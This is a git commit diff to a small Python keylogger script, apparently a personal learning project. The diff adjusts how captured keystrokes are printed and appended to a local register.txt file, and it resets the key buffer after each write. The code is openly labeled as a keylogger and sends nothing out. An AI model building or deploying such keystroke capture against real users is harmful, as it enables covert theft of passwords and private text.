ebd3e23597cd3b13519e55657f6b6be37908a679
mhamedbelhachemi <mhamed79@live.fr>
2021-01-27 10:57:33 +0100

    Keylogger 2.0 no true update

--- Keylogger/Keylogger.py
+++ Keylogger/Keylogger.py
@@ -8,16 +8,20 @@ def write_register(keys):
     with open("Keylogger/register.txt","a") as register:
         for key in keys:
             k = str(key).replace("'","")
+            print(k)
             if k.find("space") > 0:
                 register.write('\n')
             elif k.find("key") == -1:
                 register.write(k)
+
+                  
 
 def on_press(key):
     global keys, count
     keys.append(key)
     count+=1
     write_register(keys)
+    keys = []
     print("{} pressed".format(key))
 
 def on_release(key):
